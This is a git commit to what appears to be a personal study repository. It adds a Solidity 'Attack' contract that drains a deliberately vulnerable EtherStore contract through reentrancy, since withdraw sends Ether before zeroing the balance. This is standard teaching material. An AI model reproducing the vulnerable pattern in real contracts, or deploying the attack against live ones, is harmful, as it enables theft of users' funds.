2570abe2062cd6ef5b33165ff276ec180f6a54d1
jinwon93 <kjw8208@nate.com>
2022-07-16 14:51:59 +0900

    20220716

--- Applications/reEntrancy.sol
+++ Applications/reEntrancy.sol
@@ -2,9 +2,6 @@ pragma solidity ^0.8.13;
 
 
 
-
-
-
 contract EtherStore {
     mapping(address => uint) public balances;
 
@@ -20,6 +17,33 @@ contract EtherStore {
         require(sent, "Failed to send Ether");
 
         balances[msg.sender] = 0;
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+
+
+contract Attack {
+    EtherStore public etherStore;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // Fallback is called when EtherStore sends Ether to this contract.
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
     }
 
     // Helper function to check the balance of this contract
